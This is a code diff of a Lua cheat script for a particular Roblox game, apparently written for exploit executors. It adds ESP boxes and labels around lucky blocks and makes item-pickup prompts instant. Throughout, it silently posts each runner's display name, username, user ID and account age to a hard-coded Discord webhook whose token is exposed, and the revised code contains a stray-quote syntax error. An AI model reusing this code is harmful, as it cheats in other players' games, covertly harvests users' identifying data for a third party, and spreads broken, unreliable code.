@@ -1,4 +1,4 @@
---// تشغيل السكربت بس داخل التجربة المطلوبة
+--// تشغيل السكربت فقط داخل التجربة المحددة
 if game.PlaceId ~= 131623223084840 then return end
 
 --// Services
@@ -10,10 +10,7 @@ local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService = game:GetService("UserInputService")
 
--- clipboard helper (متوافق مع عدة exploit)
-local SetClipboard = setclipboard or toclipboard or (syn and syn.write_clipboard)
-
---// Webhook (كما هو)
+--// Webhook
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1466552183444078706/KK4pLVoGu0K_NQPy8-0I47-pQvKTr27zMP-1-3LNYbhdN3Yr288aFXROAsMljtRFevgK"
 local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
 if req then
@@ -29,22 +26,17 @@ if req then
             req({
                 Url = WEBHOOK_URL,
                 Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
+                Headers = {["Content-Type"]="application/json"},
                 Body = HttpService:JSONEncode({
-                    username = "📋 تقرير مستخدم جديد",
-                    embeds = {{
-                        description = "**Open script now !**",
-                        color = 65280,
-                        fields = {
-                            {name = "Display Name", value = displayName, inline = true},
-                            {name = "Username", value = username, inline = true},
-                            {name = "User ID", value = userId, inline = false},
-                            {name = "Account Age", value = accountAge, inline = false},
-                            {name = "Game", value = gameName, inline = false},
-                            {name = "Tik", value = displayName .. " • Rob: " .. username .. " " .. timeNow, inline = false}
-                        },
-                        timestamp = DateTime.now():ToIsoDate()
-                    }}
+                    username="📋 تقرير مستخدم جديد",
+                    embeds={{description="**Open script now !**",color=65280,fields={
+                        {name="Display Name",value=displayName,inline=true},
+                        {name="Username",value=username,inline=true},
+                        {name="User ID",value=userId,inline=false},
+                        {name="Account Age",value=accountAge,inline=false},
+                        {name="Game",value=gameName,inline=false},
+                        {name="Tik",value=displayName.." • Rob: "..username.." "..timeNow,inline=false}
+                    },timestamp=DateTime.now():ToIsoDate()}}
                 })
             })
         end)
@@ -57,113 +49,56 @@ gui.Name = "FaisalUI"
 gui.ResetOnSpawn = false
 gui.Parent = player.PlayerGui
 
-local topHeight = 26
-local buttonHeight = 28
+local topHeight, buttonHeight = 26, 28
 local isMobile = (UserInputService.TouchEnabled or UserInputService.GamepadEnabled) and not UserInputService.KeyboardEnabled
-local mainWidth, mainHeight = isMobile and 100 or 200, isMobile and 150 or (topHeight + 2*(buttonHeight + 6))
+local mainWidth, mainHeight = isMobile and 100 or 200, topHeight + 2*(buttonHeight + 6)
 
-local main = Instance.new("Frame", gui)
+local main = Instance.new("Frame")
+main.Parent = gui
 main.Size = UDim2.fromOffset(mainWidth, mainHeight)
-main.Position = UDim2.new(0.02, 0, 0.35, 0)
+main.Position = UDim2.new(0.02,0,0.35,0)
 main.BackgroundColor3 = Color3.fromRGB(15,15,15)
 main.BorderSizePixel = 0
-main.Active = true
-main.Draggable = true
+main.Active, main.Draggable = true, true
 Instance.new("UICorner", main).CornerRadius = UDim.new(0,10)
 
--- Top bar
-local top = Instance.new("Frame", main)
+--// Top bar
+local top = Instance.new("Frame", main")
 top.Size = UDim2.new(1,0,0,topHeight)
 top.BackgroundColor3 = Color3.fromRGB(25,25,25)
 top.BorderSizePixel = 0
 Instance.new("UICorner", top).CornerRadius = UDim.new(0,10)
 
 local title = Instance.new("TextLabel", top)
-title.Size = UDim2.new(1,-(topHeight+4),1,0) -- نترك مساحة لصورة الديسكورد على اليسار
-title.Position = UDim2.new(0, (topHeight+4), 0, 0)
+title.Size = UDim2.new(1,0,1,0)
 title.BackgroundTransparency = 1
 title.Text = "faisal-script"
 title.TextColor3 = Color3.fromRGB(230,230,230)
 title.TextSize = 12
 title.Font = Enum.Font.GothamBold
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.RichText = false
+title.TextXAlignment = Enum.TextXAlignment.Center
 
--- ========== Discord Image Button (دائري) ==========
-local DISCORD_LINK = "https://discord.gg/r54j6Y4M6h"
-
+--// Discord Image Button
 local discordBtn = Instance.new("ImageButton", top)
-discordBtn.Size = UDim2.fromOffset(topHeight - 4, topHeight - 4) -- نفس حجم الزر تقريبا لكن أصغر شوية
-discordBtn.Position = UDim2.new(0,4,0.5, -(topHeight-4)/2)
-discordBtn.BackgroundTransparency = 0
-discordBtn.BackgroundColor3 = Color3.fromRGB(35, 39, 43)
-discordBtn.Image = "rbxassetid://13758883121" -- لو عندك asset id أفضل، حطّه هنا
+discordBtn.Size = UDim2.fromOffset(topHeight, topHeight)
+discordBtn.Position = UDim2.new(1,-topHeight,0,0)
+discordBtn.BackgroundTransparency = 1
+discordBtn.Image = "rbxassetid://106638665125185"
 discordBtn.ScaleType = Enum.ScaleType.Fit
-local discordCorner = Instance.new("UICorner", discordBtn)
-discordCorner.CornerRadius = UDim.new(1,0) -- يخليها دائرية
-
--- Tooltip label فوق الصورة (يظهر لما تمرر الفأرة)
-local tooltip = Instance.new("TextLabel", top)
-tooltip.Size = UDim2.new(0,80,0,20)
-tooltip.Position = UDim2.new(0,4,0, -22)
-tooltip.BackgroundTransparency = 1
-tooltip.TextColor3 = Color3.new(1,1,1)
-tooltip.Font = Enum.Font.Gotham
-tooltip.TextSize = 12
-tooltip.Text = "Discord"
-tooltip.Visible = false
-
-discordBtn.MouseEnter:Connect(function()
-    tooltip.Visible = true
-end)
-discordBtn.MouseLeave:Connect(function()
-    tooltip.Visible = false
-end)
-
 discordBtn.MouseButton1Click:Connect(function()
-    if SetClipboard then
-        SetClipboard(DISCORD_LINK)
-    end
+    if setclipboard then setclipboard("https://discord.gg/r54j6Y4M6h") end
 end)
 
--- small X button على اليمين علشان تخفي/تسترجع الزر
-local hideBtn = Instance.new("TextButton", top)
-hideBtn.Size = UDim2.fromOffset(16,16)
-hideBtn.Position = UDim2.new(1, -(16+4), 0.5, -8)
-hideBtn.Text = "✕"
-hideBtn.BackgroundTransparency = 0
-hideBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-hideBtn.TextColor3 = Color3.new(1,1,1)
-hideBtn.Font = Enum.Font.Gotham
-hideBtn.TextSize = 12
-Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0,4)
+--// Toggle arrow
+local arrow = Instance.new("TextButton", top)
+arrow.Size = UDim2.fromOffset(topHeight, topHeight)
+arrow.Position = UDim2.new(0,0,0,0)
+arrow.Text = "▼"
+arrow.BackgroundTransparency = 1
+arrow.TextSize = 12
+arrow.Font = Enum.Font.GothamBold
+arrow.TextColor3 = Color3.fromRGB(220,220,220)
 
-local restoreBtn = Instance.new("TextButton", top)
-restoreBtn.Size = UDim2.fromOffset(16,16)
-restoreBtn.Position = UDim2.new(1, -(16+4+20), 0.5, -8)
-restoreBtn.Text = "↺"
-restoreBtn.BackgroundTransparency = 0
-restoreBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-restoreBtn.TextColor3 = Color3.new(1,1,1)
-restoreBtn.Font = Enum.Font.Gotham
-restoreBtn.TextSize = 12
-Instance.new("UICorner", restoreBtn).CornerRadius = UDim.new(0,4)
-restoreBtn.Visible = false
-
-hideBtn.MouseButton1Click:Connect(function()
-    discordBtn.Visible = false
-    tooltip.Visible = false
-    hideBtn.Visible = false
-    restoreBtn.Visible = true
-end)
-
-restoreBtn.MouseButton1Click:Connect(function()
-    discordBtn.Visible = true
-    hideBtn.Visible = true
-    restoreBtn.Visible = false
-end)
-
--- ========== Content (Buttons) ==========
 local content = Instance.new("Frame", main)
 content.Position = UDim2.new(0,0,0,topHeight)
 content.Size = UDim2.new(1,0,1,-topHeight)
@@ -174,187 +109,163 @@ layout.Padding = UDim.new(0,5)
 layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 layout.VerticalAlignment = Enum.VerticalAlignment.Top
 
-local function makeButton(text)
-    local b = Instance.new("TextButton", content)
-    b.Size = UDim2.new(0, mainWidth-10, 0, buttonHeight)
-    b.BackgroundColor3 = Color3.fromRGB(50,50,50)
-    b.Text = text
-    b.TextColor3 = Color3.fromRGB(230,230,230)
-    b.Font = Enum.Font.GothamBold
-    b.TextSize = 11
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0,6)
-    return b
-end
-
-local instantBtn = makeButton("Instant Take")
-instantBtn.MouseButton1Click:Connect(function()
-    for _,v in ipairs(workspace:GetDescendants()) do
-        if v:IsA("ProximityPrompt") then
-            v.HoldDuration = 0
-        end
-    end
+local opened = true
+local openSize, closeSize = main.Size, UDim2.fromOffset(mainWidth,topHeight)
+arrow.MouseButton1Click:Connect(function()
+    opened = not opened
+    arrow.Text = opened and "▼" or "▲"
+    content.Visible = opened
+    TweenService:Create(main,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
+        {Size = opened and openSize or closeSize}):Play()
 end)
 
-local refreshBtn = makeButton("ESP+Refresh")
+--// Instant ProximityPrompt
+local function setPromptInstant(prompt)
+    if prompt:IsA("ProximityPrompt") then prompt.HoldDuration = 0 end
+end
+for _,v in ipairs(workspace:GetDescendants()) do setPromptInstant(v) end
+workspace.DescendantAdded:Connect(setPromptInstant)
 
--- ========== Blocks list (complete for Natural, Event, Global) ==========
+local instantBtn = Instance.new("TextButton")
+instantBtn.Parent = content
+instantBtn.Size = UDim2.new(0,mainWidth-10,0,buttonHeight)
+instantBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+instantBtn.Text = "Instant Take"
+instantBtn.TextColor3 = Color3.fromRGB(230,230,230)
+instantBtn.TextSize = 11
+instantBtn.Font = Enum.Font.GothamBold
+instantBtn.BorderSizePixel = 0
+Instance.new("UICorner", instantBtn).CornerRadius = UDim.new(0,6)
+instantBtn.MouseButton1Click:Connect(function()
+    for _,v in ipairs(workspace:GetDescendants()) do setPromptInstant(v) end
+end)
+
+local refreshBtn = Instance.new("TextButton")
+refreshBtn.Parent = content
+refreshBtn.Size = UDim2.new(0,mainWidth-10,0,buttonHeight)
+refreshBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+refreshBtn.Text = "ESP+Refresh"
+refreshBtn.TextColor3 = Color3.fromRGB(230,230,230)
+refreshBtn.TextSize = 11
+refreshBtn.Font = Enum.Font.GothamBold
+refreshBtn.BorderSizePixel = 0
+Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0,6)
+
+--// Blocks list
 local orderedBlocks = {
     -- Natural
-    {model = "NaturalLuckyBlock_Common", color = Color3.fromRGB(200,200,200)},
-    {model = "NaturalLuckyBlock_Uncommon", color = Color3.fromRGB(0,255,0)},
-    {model = "NaturalLuckyBlock_Rare", color = Color3.fromRGB(0,150,255)},
-    {model = "NaturalLuckyBlock_Epic", color = Color3.fromRGB(128,0,128)},
-    {model = "NaturalLuckyBlock_Legendary", color = Color3.fromRGB(255,255,0)},
-    {model = "NaturalLuckyBlock_Mythical", color = Color3.fromRGB(128,0,128)},
-    {model = "NaturalLuckyBlock_Cosmic", color = Color3.fromRGB(0,0,0)},
-    {model = "NaturalLuckyBlock_Secret", color = Color3.fromRGB(255,0,0)},
-    {model = "NaturalLuckyBlock_UFO", color = Color3.fromRGB(0,255,127)},
-    {model = "NaturalLuckyBlock_Money", color = Color3.fromRGB(200,255,0)},
-    {model = "NaturalLuckyBlock_Radioactive", color = Color3.fromRGB(57,255,20)},
-    {model = "NaturalLuckyBlock_Admin", color = "RAINBOW"},
-    {model = "NaturalLuckyBlock_Divine", color = Color3.fromRGB(255,255,0)},
+    {model="NaturalLuckyBlock_Common", color=Color3.fromRGB(200,200,200)},
+    {model="NaturalLuckyBlock_Uncommon", color=Color3.fromRGB(0,255,0)},
+    {model="NaturalLuckyBlock_Rare", color=Color3.fromRGB(0,150,255)},
+    {model="NaturalLuckyBlock_Epic", color=Color3.fromRGB(128,0,128)},
+    {model="NaturalLuckyBlock_Legendary", color=Color3.fromRGB(255,255,0)},
+    {model="NaturalLuckyBlock_Mythical", color=Color3.fromRGB(128,0,128)},
+    {model="NaturalLuckyBlock_Cosmic", color=Color3.fromRGB(0,0,0)},
+    {model="NaturalLuckyBlock_Secret", color=Color3.fromRGB(255,0,0)},
+    {model="NaturalLuckyBlock_UFO", color=Color3.fromRGB(0,255,127)},
+    {model="NaturalLuckyBlock_Money", color=Color3.fromRGB(255,255,0)},
+    {model="NaturalLuckyBlock_Radioactive", color=Color3.fromRGB(0,255,0)},
+    {model="NaturalLuckyBlock_Admin", color=Color3.fromRGB(255,0,255)},
+    {model="NaturalLuckyBlock_Divine", color=Color3.fromRGB(255,255,0)},
 
     -- Event
-    {model = "EventLuckyBlock_Common", color = Color3.fromRGB(180,180,180)},
-    {model = "EventLuckyBlock_Uncommon", color = Color3.fromRGB(0,200,0)},
-    {model = "EventLuckyBlock_Rare", color = Color3.fromRGB(0,120,255)},
-    {model = "EventLuckyBlock_Epic", color = Color3.fromRGB(150,0,200)},
-    {model = "EventLuckyBlock_Legendary", color = Color3.fromRGB(255,230,0)},
-    {model = "EventLuckyBlock_Mythical", color = Color3.fromRGB(128,0,128)},
-    {model = "EventLuckyBlock_Cosmic", color = Color3.fromRGB(40,40,40)},
-    {model = "EventLuckyBlock_Secret", color = Color3.fromRGB(255,50,50)},
-    {model = "EventLuckyBlock_Celestial", color = Color3.fromRGB(0,200,255)},
-    {model = "EventLuckyBlock_UFO", color = Color3.fromRGB(0,255,127)},
-    {model = "EventLuckyBlock_Money", color = Color3.fromRGB(200,255,0)},
-    {model = "EventLuckyBlock_Radioactive", color = Color3.fromRGB(57,255,20)},
-    {model = "EventLuckyBlock_Admin", color = "RAINBOW"},
-    {model = "EventLuckyBlock_Divine", color = Color3.fromRGB(255,255,0)},
+    {model="EventLuckyBlock_Common", color=Color3.fromRGB(180,180,180)},
+    {model="EventLuckyBlock_Uncommon", color=Color3.fromRGB(0,200,0)},
+    {model="EventLuckyBlock_Rare", color=Color3.fromRGB(0,120,255)},
+    {model="EventLuckyBlock_Epic", color=Color3.fromRGB(128,0,128)},
+    {model="EventLuckyBlock_Legendary", color=Color3.fromRGB(255,230,0)},
+    {model="EventLuckyBlock_Mythical", color=Color3.fromRGB(128,0,128)},
+    {model="EventLuckyBlock_Cosmic", color=Color3.fromRGB(40,40,40)},
+    {model="EventLuckyBlock_Secret", color=Color3.fromRGB(255,50,50)},
+    {model="EventLuckyBlock_Celestial", color=Color3.fromRGB(0,200,255)},
+    {model="EventLuckyBlock_UFO", color=Color3.fromRGB(0,255,127)},
+    {model="EventLuckyBlock_Money", color=Color3.fromRGB(255,255,0)},
+    {model="EventLuckyBlock_Radioactive", color=Color3.fromRGB(0,255,0)},
+    {model="EventLuckyBlock_Admin", color=Color3.fromRGB(255,0,255)},
+    {model="EventLuckyBlock_Divine", color=Color3.fromRGB(255,255,0)},
 
     -- Global
-    {model = "GlobalLuckyBlock_Common", color = Color3.fromRGB(160,160,160)},
-    {model = "GlobalLuckyBlock_Uncommon", color = Color3.fromRGB(0,255,120)},
-    {model = "GlobalLuckyBlock_Rare", color = Color3.fromRGB(0,170,255)},
-    {model = "GlobalLuckyBlock_Epic", color = Color3.fromRGB(180,0,255)},
-    {model = "GlobalLuckyBlock_Legendary", color = Color3.fromRGB(255,200,0)},
-    {model = "GlobalLuckyBlock_Mythical", color = Color3.fromRGB(128,0,128)},
-    {model = "GlobalLuckyBlock_Cosmic", color = Color3.fromRGB(70,70,70)},
-    {model = "GlobalLuckyBlock_Secret", color = Color3.fromRGB(255,80,80)},
-    {model = "GlobalLuckyBlock_Money", color = Color3.fromRGB(200,255,0)},
-    {model = "GlobalLuckyBlock_Radioactive", color = Color3.fromRGB(57,255,20)},
-    {model = "GlobalLuckyBlock_Admin", color = "RAINBOW"},
-    {model = "GlobalLuckyBlock_UFO", color = Color3.fromRGB(0,255,127)},
-    {model = "GlobalLuckyBlock_Divine", color = Color3.fromRGB(255,255,0)},
+    {model="GlobalLuckyBlock_Common", color=Color3.fromRGB(160,160,160)},
+    {model="GlobalLuckyBlock_Uncommon", color=Color3.fromRGB(0,255,120)},
+    {model="GlobalLuckyBlock_Rare", color=Color3.fromRGB(0,170,255)},
+    {model="GlobalLuckyBlock_Epic", color=Color3.fromRGB(128,0,128)},
+    {model="GlobalLuckyBlock_Legendary", color=Color3.fromRGB(255,200,0)},
+    {model="GlobalLuckyBlock_Mythical", color=Color3.fromRGB(128,0,128)},
+    {model="GlobalLuckyBlock_Cosmic", color=Color3.fromRGB(70,70,70)},
+    {model="GlobalLuckyBlock_Secret", color=Color3.fromRGB(255,80,80)},
+    {model="GlobalLuckyBlock_Money", color=Color3.fromRGB(255,255,0)},
+    {model="GlobalLuckyBlock_Radioactive", color=Color3.fromRGB(0,255,0)},
+    {model="GlobalLuckyBlock_Admin", color=Color3.fromRGB(255,0,255)},
+    {model="GlobalLuckyBlock_UFO", color=Color3.fromRGB(0,255,127)},
+    {model="GlobalLuckyBlock_Divine", color=Color3.fromRGB(255,255,0)},
 }
 
--- helper maps: اسم النوع اللي نعرضه ونص اللون حسب النوع
-local function getLabelAndTextColorFromModelName(modelName)
-    local nameLower = modelName:lower()
-    -- Priority checks
-    if nameLower:find("mythical") then return "Mythical", Color3.fromRGB(160,0,255) end
-    if nameLower:find("divine") then return "Divine", Color3.fromRGB(255,255,80) end
-    if nameLower:find("radioactive") then return "Radioactive", Color3.fromRGB(57,255,20) end
-    if nameLower:find("money") then return "Money", Color3.fromRGB(200,255,0) end
-    if nameLower:find("admin") then return "Admin", Color3.fromRGB(255,255,255) end -- admin will be rainbow-text animated
-    if nameLower:find("ufo") then return "UFO", Color3.fromRGB(0,255,127) end
-    if nameLower:find("legendary") then return "Legendary", Color3.fromRGB(255,215,0) end
-    if nameLower:find("epic") then return "Epic", Color3.fromRGB(180,0,255) end
-    if nameLower:find("rare") then return "Rare", Color3.fromRGB(0,150,255) end
-    if nameLower:find("uncommon") then return "Uncommon", Color3.fromRGB(0,200,0) end
-    if nameLower:find("common") then return "Common", Color3.fromRGB(200,200,200) end
-    if nameLower:find("secret") then return "Secret", Color3.fromRGB(255,50,50) end
-    if nameLower:find("cosmic") then return "Cosmic", Color3.fromRGB(70,70,70) end
-    -- default fallback
-    return modelName, Color3.fromRGB(255,255,255)
-end
-
--- tables to avoid duplicates
 local highlightedModels = {}
-local namesAdded = {}
+local blockNamesAdded = {}
+for _, block in ipairs(orderedBlocks) do highlightedModels[block.model] = {} end
 
--- rainbow helper for adorns or text
-local function startRainbowLoop(obj, prop)
-    -- prop = "Color3" for adorn, or "TextColor3" for label
-    task.spawn(function()
-        local i = 0
-        while obj and obj.Parent do
-            local hue = (tick() % 2) / 2 -- cycles
-            obj[prop] = Color3.fromHSV(hue, 1, 1)
-            task.wait(0.06)
-        end
-    end)
+--// Function to get last word label & color
+local function getLabelAndTextColorFromModelName(modelName)
+    local parts = {}
+    for part in string.gmatch(modelName,"[^_]+") do table.insert(parts,part) end
+    local lastWord = parts[#parts] or modelName
+    if lastWord:lower()=="mythical" then return "Mythical", Color3.fromRGB(160,0,255) end
+    if lastWord:lower()=="divine" then return "Divine", Color3.fromRGB(255,255,80) end
+    if lastWord:lower()=="radioactive" then return "Radioactive", Color3.fromRGB(57,255,20) end
+    if lastWord:lower()=="money" then return "Money", Color3.fromRGB(200,255,0) end
+    if lastWord:lower()=="admin" then return "Admin", Color3.fromRGB(255,0,255) end
+    if lastWord:lower()=="ufo" then return "UFO", Color3.fromRGB(0,255,127) end
+    if lastWord:lower()=="legendary" then return "Legendary", Color3.fromRGB(255,215,0) end
+    if lastWord:lower()=="epic" then return "Epic", Color3.fromRGB(180,0,255) end
+    if lastWord:lower()=="rare" then return "Rare", Color3.fromRGB(0,150,255) end
+    if lastWord:lower()=="uncommon" then return "Uncommon", Color3.fromRGB(0,200,0) end
+    if lastWord:lower()=="common" then return "Common", Color3.fromRGB(200,200,200) end
+    if lastWord:lower()=="secret" then return "Secret", Color3.fromRGB(255,50,50) end
+    if lastWord:lower()=="cosmic" then return "Cosmic", Color3.fromRGB(70,70,70) end
+    if lastWord:lower()=="celestial" then return "Celestial", Color3.fromRGB(0,200,255) end
+    return lastWord, Color3.fromRGB(255,255,255)
 end
 
--- highlight + name function
-local function highlightModel(model, color)
-    if highlightedModels[model] then return end
-    highlightedModels[model] = true
-
-    -- get label & text color
-    local labelText, textColor = getLabelAndTextColorFromModelName(model.Name)
-
-    -- add Billboard (only once per model)
-    if not namesAdded[model] then
-        local primaryPart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
-        if primaryPart then
-            local bill = Instance.new("BillboardGui")
-            bill.Name = "FaisalName"
-            bill.Adornee = primaryPart
-            bill.Size = UDim2.new(0,120,0,22)
-            bill.StudsOffset = Vector3.new(0, 3.5, 0)
-            bill.AlwaysOnTop = true
-            bill.Parent = model
-
-            local txt = Instance.new("TextLabel", bill)
-            txt.Size = UDim2.new(1,0,1,0)
-            txt.BackgroundTransparency = 1
-            txt.Text = labelText -- فقط النوع
-            txt.TextScaled = true
-            txt.Font = Enum.Font.GothamBold
-            txt.TextColor3 = textColor
-            -- rainbow admin text
-            if labelText == "Admin" then
-                task.spawn(function()
-                    while txt.Parent do
-                        for h=0,1,0.02 do
-                            txt.TextColor3 = Color3.fromHSV(h,1,1)
-                            task.wait(0.03)
-                        end
-                    end
-                end)
-            end
-            namesAdded[model] = true
-        end
-    end
-
-    -- add adorns to parts
+--// Highlight and add Billboard
+local function highlightModel(model,color)
+    if highlightedModels[model.Name][model] then return end
+    highlightedModels[model.Name][model] = true
     for _, part in pairs(model:GetDescendants()) do
         if part:IsA("BasePart") then
-            -- remove old adornments & billboards attached to parts only (safety)
             for _, child in pairs(part:GetChildren()) do
-                if child:IsA("BoxHandleAdornment") then child:Destroy() end
+                if child:IsA("BoxHandleAdornment") or child:IsA("BillboardGui") then child:Destroy() end
             end
-
             local adorn = Instance.new("BoxHandleAdornment")
             adorn.Adornee = part
             adorn.AlwaysOnTop = true
             adorn.ZIndex = 10
             adorn.Size = part.Size
             adorn.Transparency = 0.3
-            if color == "RAINBOW" then
-                adorn.Color3 = Color3.fromRGB(255,255,255)
-                startRainbowLoop(adorn, "Color3")
-            else
-                adorn.Color3 = color
-            end
+            adorn.Color3 = color
             adorn.Parent = part
+
+            if not blockNamesAdded[model] then
+                local labelText, textColor = getLabelAndTextColorFromModelName(model.Name)
+                local billboard = Instance.new("BillboardGui")
+                billboard.Adornee = part
+                billboard.Size = UDim2.new(0,100,0,20)
+                billboard.AlwaysOnTop = true
+                local textLabel = Instance.new("TextLabel", billboard)
+                textLabel.Size = UDim2.new(1,0,1,0)
+                textLabel.BackgroundTransparency = 1
+                textLabel.TextColor3 = textColor
+                textLabel.Font = Enum.Font.GothamBold
+                textLabel.TextSize = 12
+                textLabel.Text = labelText
+                billboard.Parent = part
+                blockNamesAdded[model] = true
+            end
         end
     end
 end
 
--- initial refresh function (runs once + on button)
-local function refreshAll()
-    namesAdded = {}
-    highlightedModels = {}
+refreshBtn.MouseButton1Click:Connect(function()
+    blockNamesAdded = {}
     for _, block in ipairs(orderedBlocks) do
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("Model") and obj.Name == block.model then
@@ -362,44 +273,12 @@ local function refreshAll()
             end
         end
     end
-end
-
--- wire refresh button
-refreshBtn.MouseButton1Click:Connect(function()
-    refreshAll()
 end)
 
--- auto-run on start
-refreshAll()
-
--- keep applying to newly added blocks
-workspace.DescendantAdded:Connect(function(desc)
-    -- small delay to allow model to set PrimaryPart etc.
-    task.wait(0.1)
-    for _, block in ipairs(orderedBlocks) do
-        if desc:IsA("Model") and desc.Name == block.model then
-            highlightModel(desc, block.color)
-        elseif desc:IsA("BasePart") and desc.Parent and desc.Parent:IsA("Model") then
-            local m = desc.Parent
-            for _, block2 in ipairs(orderedBlocks) do
-                if m.Name == block2.model then
-                    highlightModel(m, block2.color)
-                end
-            end
-        end
-    end
-end)
-
--- adapt for mobile sizing
 if isMobile then
-    local padding = 5
-    local totalHeight = 0
-    for _, btn in pairs(content:GetChildren()) do
-        if btn:IsA("TextButton") then
-            totalHeight = totalHeight + btn.Size.Y.Offset + padding
-        end
+    local padding,totalHeight = 5,0
+    for _,btn in pairs(content:GetChildren()) do
+        if btn:IsA("TextButton") then totalHeight = totalHeight + btn.Size.Y.Offset + padding end
     end
-    main.Size = UDim2.fromOffset(mainWidth, topHeight + totalHeight)
+    main.Size = UDim2.fromOffset(mainWidth, topHeight+totalHeight)
 end
-
--- end of script
